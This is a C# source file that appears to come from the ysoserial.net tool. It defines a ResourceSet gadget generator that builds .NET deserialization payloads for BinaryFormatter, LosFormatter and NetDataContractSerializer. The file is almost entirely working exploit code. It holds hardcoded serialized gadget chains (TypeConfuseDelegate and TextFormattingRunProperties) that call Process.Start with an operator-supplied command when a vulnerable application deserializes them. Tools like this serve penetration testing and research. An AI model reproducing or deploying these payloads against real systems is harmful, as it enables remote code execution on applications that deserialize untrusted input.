using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Resources;
using System.Text;
using ysoserial.Helpers;
using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysoserial.Generators
{
    public class ResourceSetGenerator : GenericGenerator
    {
        private int internalgadget = 1; // Default

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override string Name()
        {
            return "ResourceSet";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.Dummy }; // It works because we have a hashtable that holds the actual gadget!
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"ig|internalgadget=", "The numerical internal gadget choice to use: 1=TypeConfuseDelegate, 2=TextFormattingRunProperties (default: 1 [TypeConfuseDelegate])", v => int.TryParse(v, out internalgadget) }
            };

            return options;
        }
        public override object Generate(string formatter, InputArgs inputArgs)
        {
            /*
             * // This is how ResourceSet can be used directly but the payload would fire!
            object generatedPayload = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);

            using (ResourceWriter rw = new ResourceWriter(@".\ResourceSetGenerator.resources"))
            {
                rw.AddResource("", generatedPayload);
                rw.Generate();
                rw.Close();
            }

            // Payload will be executed once here which is annoying but without surgical insertion or something to parse binaryformatter objects, it is quite hard to prevent this
            ResourceSet myResourceSet = new ResourceSet(@".\ResourceSetGenerator.resources");

            // TextFormattingRunPropertiesGenerator is the preferred method due to its short length. However, we need to insert it manually into a serialized object as ResourceSet cannot tolerate it 

            //*/

            //TestMore(inputArgs);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                string payload = "";
                // This to prevent code execution when running
                byte[] bfSerializedObj;

                if (internalgadget == 1)
                {
                    // This is an example of using SimpleBinaryFormatterParser
                    //
                    string obj25Type = "", obj25Value = "", obj26Value = "";

                    byte[] cmdFile7bitLV = SimpleBinaryFormatterParser.Create7bitLengthObjectString(inputArgs.CmdFileName);
                    byte[] obj26ValueObjId = new byte[] { 0x0c, 0, 0, 0 };
                    obj26Value = Convert.ToBase64String(SimpleBinaryFormatterParser.ConcatTwoByteArrays(obj26ValueObjId, cmdFile7bitLV));

                    if (inputArgs.HasArguments)
                    {
                        byte[] obj25TypeByte = new byte[] { 0x06 };
                        byte[] obj25ValueObjId = new byte[] { 0x0b, 0, 0, 0 };
                        byte[] cmdArgs7bitLV = SimpleBinaryFormatterParser.Create7bitLengthObjectString(inputArgs.CmdArguments);

                        obj25Type = Convert.ToBase64String(obj25TypeByte);
                        obj25Value = Convert.ToBase64String(SimpleBinaryFormatterParser.ConcatTwoByteArrays(obj25ValueObjId, cmdArgs7bitLV));
                    }
                    else
                    {
                        byte[] obj25TypeByte = new byte[] { 0x09 };
                        byte[] obj25ValueObjId = new byte[] { 0x05, 0, 0, 0 };

                        obj25Type = Convert.ToBase64String(obj25TypeByte);
                        obj25Value = Convert.ToBase64String(obj25ValueObjId);
                    }

                    payload = @"{'headerBytes':'AAEAAAD/////AQAAAAAAAAA=','binaryFormatterObjects':[{'orderId':1,'typeBytes':'BA==','valueBytes':'AQAAABxTeXN0ZW0uUmVzb3VyY2VzLlJlc291cmNlU2V0AgAAAAVUYWJsZRVfY2FzZUluc2Vuc2l0aXZlVGFibGUDAxxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlHFN5c3RlbS5Db2xsZWN0aW9ucy5IYXNodGFibGU='},{'orderId':2,'typeBytes':'CQ==','valueBytes':'AgAAAA=='},{'orderId':3,'typeBytes':'Cg==','valueBytes':''},{'orderId':4,'typeBytes':'BA==','valueBytes':'AgAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlBwAAAApMb2FkRmFjdG9yB1ZlcnNpb24IQ29tcGFyZXIQSGFzaENvZGVQcm92aWRlcghIYXNoU2l6ZQRLZXlzBlZhbHVlcwAAAwMABQULCBxTeXN0ZW0uQ29sbGVjdGlvbnMuSUNvbXBhcmVyJFN5c3RlbS5Db2xsZWN0aW9ucy5JSGFzaENvZGVQcm92aWRlcgg='},{'orderId':5,'typeBytes':null,'valueBytes':'7FE4Pw=='},{'orderId':6,'typeBytes':null,'valueBytes':'AQAAAA=='},{'orderId':7,'typeBytes':'Cg==','valueBytes':''},{'orderId':8,'typeBytes':'Cg==','valueBytes':''},{'orderId':9,'typeBytes':null,'valueBytes':'AwAAAA=='},{'orderId':10,'typeBytes':'CQ==','valueBytes':'AwAAAA=='},{'orderId':11,'typeBytes':'CQ==','valueBytes':'BAAAAA=='},{'orderId':12,'typeBytes':'EA==','valueBytes':'AwAAAAEAAAA='},{'orderId':13,'typeBytes':'Bg==','valueBytes':'BQAAAAA='},{'orderId':14,'typeBytes':'EA==','valueBytes':'BAAAAAEAAAA='},{'orderId':15,'typeBytes':'CQ==','valueBytes':'BgAAAA=='},{'orderId':16,'typeBytes':'DA==','valueBytes':'BwAAAEZTeXN0ZW0sVmVyc2lvbj00LjAuMC4wLEN1bHR1cmU9bmV1dHJhbCxQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5'},{'orderId':17,'typeBytes':'BQ==','valueBytes':'BgAAAEBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZyxtc2NvcmxpYl1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABghJU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdXQgHAAAA'},{'orderId':18,'typeBytes':null,'valueBytes':'AgAAAA=='},{'orderId':19,'typeBytes':'CQ==','valueBytes':'CAAAAA=='},{'orderId':20,'typeBytes':null,'valueBytes':'AgAAAA=='},{'orderId':21,'typeBytes':'CQ==','valueBytes':'CQAAAA=='},{'orderId':22,'typeBytes':'BA==','valueBytes':'CAAAAElTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZyxtc2NvcmxpYl1dAQAAAAtfY29tcGFyaXNvbgMiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcg=='},{'orderId':23,'typeBytes':'CQ==','valueBytes':'CgAAAA=='},{'orderId':24,'typeBytes':'EQ==','valueBytes':'CQAAAAIAAAA='},{'orderId':25,'typeBytes':'" + obj25Type + @"','valueBytes':'" + obj25Value + @"'},{'orderId':26,'typeBytes':'Bg==','valueBytes':'" + obj26Value + @"'},{'orderId':27,'typeBytes':'BA==','valueBytes':'CgAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVy'},{'orderId':28,'typeBytes':'CQ==','valueBytes':'DQAAAA=='},{'orderId':29,'typeBytes':'CQ==','valueBytes':'DgAAAA=='},{'orderId':30,'typeBytes':'CQ==','valueBytes':'DwAAAA=='},{'orderId':31,'typeBytes':'BA==','valueBytes':'DQAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQ=='},{'orderId':32,'typeBytes':'Bg==','valueBytes':'EAAAAKQBU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZyxtc2NvcmxpYl0sW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyxTeXN0ZW0sVmVyc2lvbj00LjAuMC4wLEN1bHR1cmU9bmV1dHJhbCxQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0='},{'orderId':33,'typeBytes':'Bg==','valueBytes':'EQAAAAhtc2NvcmxpYg=='},{'orderId':34,'typeBytes':'Cg==','valueBytes':''},{'orderId':35,'typeBytes':'Bg==','valueBytes':'EgAAAEZTeXN0ZW0sVmVyc2lvbj00LjAuMC4wLEN1bHR1cmU9bmV1dHJhbCxQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5'},{'orderId':36,'typeBytes':'Bg==','valueBytes':'EwAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcw=='},{'orderId':37,'typeBytes':'Bg==','valueBytes':'FAAAAAVTdGFydA=='},{'orderId':38,'typeBytes':'CQ==','valueBytes':'FQAAAA=='},{'orderId':39,'typeBytes':'BA==','valueBytes':'DgAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgYAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAAMIDVN5c3RlbS5UeXBlW10='},{'orderId':40,'typeBytes':'CQ==','valueBytes':'FAAAAA=='},{'orderId':41,'typeBytes':'CQ==','valueBytes':'EgAAAA=='},{'orderId':42,'typeBytes':'CQ==','valueBytes':'EwAAAA=='},{'orderId':43,'typeBytes':'Bg==','valueBytes':'GQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQ=='},{'orderId':44,'typeBytes':null,'valueBytes':'CAAAAA=='},{'orderId':45,'typeBytes':'Cg==','valueBytes':''},{'orderId':46,'typeBytes':'AQ==','valueBytes':'DwAAAA4AAAA='},{'orderId':47,'typeBytes':'Bg==','valueBytes':'GgAAAAdDb21wYXJl'},{'orderId':48,'typeBytes':'CQ==','valueBytes':'EQAAAA=='},{'orderId':49,'typeBytes':'Bg==','valueBytes':'HAAAAA1TeXN0ZW0uU3RyaW5n'},{'orderId':50,'typeBytes':'Bg==','valueBytes':'HQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcp'},{'orderId':51,'typeBytes':null,'valueBytes':'CAAAAA=='},{'orderId':52,'typeBytes':'Cg==','valueBytes':''},{'orderId':53,'typeBytes':'AQ==','valueBytes':'FQAAAA0AAAA='},{'orderId':54,'typeBytes':'Bg==','valueBytes':'HgAAAC1TeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLG1zY29ybGliXV0='},{'orderId':55,'typeBytes':'CQ==','valueBytes':'EQAAAA=='},{'orderId':56,'typeBytes':'Cg==','valueBytes':''},{'orderId':57,'typeBytes':'CQ==','valueBytes':'EQAAAA=='},{'orderId':58,'typeBytes':'CQ==','valueBytes':'HAAAAA=='},{'orderId':59,'typeBytes':'CQ==','valueBytes':'GgAAAA=='},{'orderId':60,'typeBytes':'Cg==','valueBytes':''},{'orderId':61,'typeBytes':'Cw==','valueBytes':''}]}";
                    
                    bfSerializedObj = SimpleBinaryFormatterParser.JsonToStream(payload).ToArray();
                }
                else
                {
                    // This is an example of using AdvancedBinaryFormatterParser which is recommended over SimpleBinaryFormatterParser but it is much longer

                    // In this gadget however, this feels like cheating as System.Resources.ResourceSet can be replaced by anything given the TextFormattingRunProperties gadget triggers first
                    ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();

                    string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();

                    if (inputArgs.Minify)
                    {
                        xaml_payload = XmlHelper.Minify(xaml_payload, null, null);
                    }

                    xaml_payload = CommandArgSplitter.JsonStringEscape(xaml_payload);

                    // This payload has been minified manually too by removing some of the unnecessary items!
                    payload = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 1,
      'name': 'System.Resources.ResourceSet',
      'numMembers': 2,
      'memberNames':['',''],
      'binaryTypeEnumA':[3,3],
      'typeInformationA':[null,null],
      'typeInformationB':['',''],
      'memberAssemIds':[0,0],
      'assemId': 0
}},{'Id': 3,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 2
}},{'Id': 4,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 5,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 2,
      'name': 'System.Collections.Hashtable',
      'numMembers': 5,
      'memberNames':['LoadFactor','Version','Comparer','','HashSize'],
      'binaryTypeEnumA':[0,0,3,3,0],
      'typeInformationA':[11,8,null,null,8],
      'typeInformationB':[11,8,'','',8],
      'memberAssemIds':[0,0,0,0,0],
      'assemId': 0
}},{'Id': 6,
    'TypeName': 'Single',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 11,
      'value': 0
}},{'Id': 7,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 1
}},{'Id': 8,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 9,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 10,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 3
}},{'Id': 11,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 7,
      'assemblyString': 'Microsoft.PowerShell.Editor'
}},{'Id': 12,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 6,
      'name': 'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties',
      'numMembers': 1,
      'memberNames':['ForegroundBrush'],
      'binaryTypeEnumA':[1],
      'typeInformationA':[null],
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 7
}},{'Id': 13,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 8,
      'value': '" + xaml_payload + @"'
}},{'Id': 14,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

                    bfSerializedObj = AdvancedBinaryFormatterParser.JsonToStream(payload).ToArray();
                }

                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    if (inputArgs.Test)
                    {
                        try
                        {
                            MemoryStream ms = new MemoryStream(bfSerializedObj);
                            ms.Position = 0;
                            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                            bf.Deserialize(ms);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return bfSerializedObj;
                }
                else
                {
                    // it is LosFormatter
                    byte[] lfSerializedObj = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(bfSerializedObj);

                    MemoryStream ms = new MemoryStream(lfSerializedObj);
                    ms.Position = 0;
                    if (inputArgs.Test)
                    {
                        try
                        {
                            System.Web.UI.LosFormatter lf = new System.Web.UI.LosFormatter();
                            lf.Deserialize(ms);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return lfSerializedObj;
                }
                //return Serialize(myResourceSet, formatter, inputArgs);
            }
            else if (formatter.Equals("netdatacontractserializer", StringComparison.OrdinalIgnoreCase))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                string ndcPayload = "";

                if (internalgadget == 1)
                {
                    string cmdPart = "";

                    if (inputArgs.HasArguments)
                    {
                        cmdPart = "<c:string>" + inputArgs.CmdArguments + "</c:string><c:string>" + inputArgs.CmdFileName + "</c:string>";
                    }
                    else
                    {
                        cmdPart = @"<c:string a:nil=""true""/><c:string>" + inputArgs.CmdFileName + "</c:string>";
                    }

                    ndcPayload = @"<w b:Type=""System.Resources.ResourceSet"" b:Assembly=""0"" xmlns=""http://schemas.datacontract.org/2004/07/System.Resources"" xmlns:a=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/""><Table b:Type=""System.Collections.Hashtable"" b:Assembly=""0"" xmlns:c=""http://schemas.microsoft.com/2003/10/Serialization/Arrays""><LoadFactor b:Type=""System.Single"" b:Assembly=""0"" xmlns="""">0</LoadFactor><Version b:Type=""System.Int32"" b:Assembly=""0"" xmlns="""">1</Version><HashSize b:Type=""System.Int32"" b:Assembly=""0"" xmlns="""">3</HashSize><Values b:Type=""System.Object[]"" b:Assembly=""0"" b:Size=""1"" xmlns=""""><c:anyType b:Type=""System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]"" b:Assembly=""System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089""><Count b:Type=""System.Int32"" b:Assembly=""0"">2</Count><Comparer b:Type=""System.Collections.Generic.ComparisonComparer`1[[System.String,mscorlib]]"" b:Assembly=""0""><_comparison b:FactoryType=""d:DelegateSerializationHolder"" b:Type=""System.DelegateSerializationHolder"" b:Assembly=""0"" xmlns=""http://schemas.datacontract.org/2004/07/System.Collections.Generic"" xmlns:d=""http://schemas.datacontract.org/2004/07/System""><Delegate b:Type=""System.DelegateSerializationHolder+DelegateEntry"" b:Assembly=""0"" xmlns=""""><d:assembly b:Id=""1"">mscorlib</d:assembly><d:delegateEntry><d:assembly b:Ref=""1"" a:nil=""1""/><d:delegateEntry a:nil=""1""/><d:methodName b:Id=""2"">Compare</d:methodName><d:target a:nil=""1""/><d:targetTypeAssembly b:Ref=""1"" a:nil=""1""/><d:targetTypeName b:Id=""3"">System.String</d:targetTypeName><d:type>System.Comparison`1[[System.String,mscorlib]]</d:type></d:delegateEntry><d:methodName b:Id=""4"">Start</d:methodName><d:target a:nil=""1""/><d:targetTypeAssembly b:Id=""5"">System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089</d:targetTypeAssembly><d:targetTypeName b:Id=""6"">System.Diagnostics.Process</d:targetTypeName><d:type>System.Func`3[[System.String,mscorlib],[System.String,mscorlib],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]</d:type></Delegate><method0 b:FactoryType=""e:MemberInfoSerializationHolder"" b:Type=""System.Reflection.MemberInfoSerializationHolder"" b:Assembly=""0"" xmlns=""""><Name b:Ref=""4"" a:nil=""1""/><AssemblyName b:Ref=""5"" a:nil=""1""/><ClassName b:Ref=""6"" a:nil=""1""/><Signature b:Type=""System.String"" b:Assembly=""0"">System.Diagnostics.Process Start(System.String, System.String)</Signature><MemberType b:Type=""System.Int32"" b:Assembly=""0"">8</MemberType><GenericArguments a:nil=""1""/></method0><method1 b:FactoryType=""e:MemberInfoSerializationHolder"" b:Type=""System.Reflection.MemberInfoSerializationHolder"" b:Assembly=""0"" xmlns=""""><Name b:Ref=""2"" a:nil=""1""/><AssemblyName b:Ref=""1"" a:nil=""1""/><ClassName b:Ref=""3"" a:nil=""1""/><Signature b:Type=""System.String"" b:Assembly=""0"">Int32 Compare(System.String, System.String)</Signature><MemberType b:Type=""System.Int32"" b:Assembly=""0"">8</MemberType></method1></_comparison></Comparer><Version b:Type=""System.Int32"" b:Assembly=""0"">2</Version><Items b:Type=""System.String[]"" b:Assembly=""0"" b:Size=""2"">" + cmdPart + @"</Items></c:anyType></Values></Table></w>";
                }
                else
                {
                    ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();

                    string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();

                    if (inputArgs.Minify)
                    {
                        xaml_payload = XmlHelper.Minify(xaml_payload, null, null);
                    }

                    ndcPayload = @"<w b:Type=""System.Resources.ResourceSet"" b:Assembly=""0"" xmlns=""http://schemas.datacontract.org/2004/07/System.Resources"" xmlns:a=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/""><Table b:Type=""System.Collections.Hashtable"" b:Assembly=""0"" xmlns:c=""http://schemas.microsoft.com/2003/10/Serialization/Arrays""><LoadFactor b:Type=""System.Single"" b:Assembly=""0"" xmlns="""">0</LoadFactor><Version b:Type=""System.Int32"" b:Assembly=""0"" xmlns="""">1</Version><HashSize b:Type=""System.Int32"" b:Assembly=""0"" xmlns="""">3</HashSize><Values b:Type=""System.Object[]"" b:Assembly=""0"" b:Size=""1"" xmlns=""""><c:anyType b:Type=""Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"" b:Assembly=""Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35""><ForegroundBrush b:Type=""System.String"" b:Assembly=""0""><![CDATA[" + xaml_payload + @"]]></ForegroundBrush></c:anyType></Values></Table></w>";
                    //</Values></Table></w> can also be removed to make it even shorter! Why? IDK atm!       
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        ndcPayload = XmlHelper.Minify(ndcPayload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor" }, new string[] { "</Values></Table></w>" }, FormatterType.NetDataContractXML, true);
                    }
                    else
                    {
                        ndcPayload = XmlHelper.Minify(ndcPayload, null, new string[] { "</Values></Table></w>" }, FormatterType.NetDataContractXML, true);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(ndcPayload);
                        /*
                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(ndcPayload));
                        ms.Position = 0;
                        ndcs.Deserialize(ms);
                        */
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }

                return ndcPayload;
                //return Serialize(myResourceSet, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        /*
         * This shows how the json encoded payloads can be created when we can have a working payload
        */
        /*
        public void TestMore(InputArgs inputArgs)
        {
            object generatedPayload = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);

            using (ResourceWriter rw = new ResourceWriter(@".\ResourceSetGenerator.resources"))
            {
                rw.AddResource("", generatedPayload);
                rw.Generate();
                rw.Close();
            }

            // Payload will be executed once here which is annoying but without surgical insertion or something to parse binaryformatter objects, it is quite hard to prevent this
            ResourceSet myResourceSet = new ResourceSet(@".\ResourceSetGenerator.resources");

            // TextFormattingRunPropertiesGenerator is the preferred method due to its short length. However, we need to insert it manually into a serialized object as ResourceSet cannot tolerate it 

            BinaryFormatter myBf = new BinaryFormatter();
            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter realBF = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            MemoryStream ms = new MemoryStream();

            myBf.Serialize(ms, myResourceSet);

            
            Console.WriteLine(Convert.ToBase64String(ms.ToArray()));
            List<AdvancedBinaryFormatterObject> myObjs = AdvancedBinaryFormatterParser.Parse(ms);
            
            String jsonNetStr =AdvancedBinaryFormatterParser.JsonNetBinaryFormatterObjectSerializer(myObjs);
            MemoryStream ms4 = new MemoryStream();
            ms4 = AdvancedBinaryFormatterParser.ReconstructFromJsonNetSerializedBinaryFormatterObject(jsonNetStr);
            Console.WriteLine(Convert.ToBase64String(ms4.ToArray()));

            List<AdvancedBinaryFormatterObject> myObjs3 = AdvancedBinaryFormatterParser.Parse(ms4,true);

            ms4.Position = 0;
            realBF.Deserialize(ms4);
            Console.ReadLine();
            System.Environment.Exit(1);  
        }
        */
    }
}
